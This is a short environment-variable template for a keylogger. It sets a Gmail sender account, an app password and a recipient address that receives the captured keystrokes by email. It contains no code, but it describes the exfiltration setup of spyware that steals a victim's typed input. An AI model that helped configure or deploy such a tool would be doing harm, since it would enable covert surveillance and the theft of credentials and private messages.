# Copy this file to .env and fill in your values.
# Never commit .env to version control.

# Gmail account used to SEND the captured keystrokes
KEYLOGGER_EMAIL=you@gmail.com

# App password (not your login password).
# Generate one at: https://myaccount.google.com/apppasswords
KEYLOGGER_PASSWORD=your_app_password_here

# Address that receives the captured keystrokes
KEYLOGGER_RECIPIENT=recipient@example.com
